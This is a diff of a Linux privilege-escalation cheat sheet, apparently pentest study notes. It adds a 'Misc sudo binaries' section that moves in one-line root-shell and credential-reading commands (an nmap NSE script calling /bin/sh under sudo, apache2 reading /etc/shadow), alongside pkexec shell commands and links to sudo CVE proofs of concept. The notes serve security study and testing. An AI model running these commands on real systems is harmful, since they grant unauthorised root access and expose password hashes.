@@ -52,7 +52,7 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
 [Breaking out of shellcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells) 
 ## Sudo exploits 
 sudo -l, cat /etc/sudoers, check gtfobins  
-sudo -V 
+sudo -V    
 ## Sudo LD_PRELOAD   
 sudo -l, see env_keep+=LD_PRELOAD. apache2
 
@@ -76,9 +76,12 @@ sudo -l, see (ALL,!root)
 ## CVE-2019-16634 
 sudo su root, type password, see ******: passwd feedback enabled  
 
-[proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634) 
+[proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634)  
 ## CVE-2021-3156 - Baron Samedit 
-[proof of concept](https://github.com/stong/CVE-2021-3156) 
+[proof of concept](https://github.com/stong/CVE-2021-3156)  
+## Misc sudo binaries  
+    echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
+    sudo apache2 -f /etc/shadow
 
 ## Cronjobs    
 look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 
@@ -138,8 +141,6 @@ set PATH variable to current directory and run suid binary
 use binary to exec /bin/bash -p 
 
     pkexec --user root /bin/sh  
-    echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
-    sudo apache2 -f /etc/shadow
 ## Services Running as Root / Services Only Running Locally
     ps -aux | grep root 
     netstat -etulp 
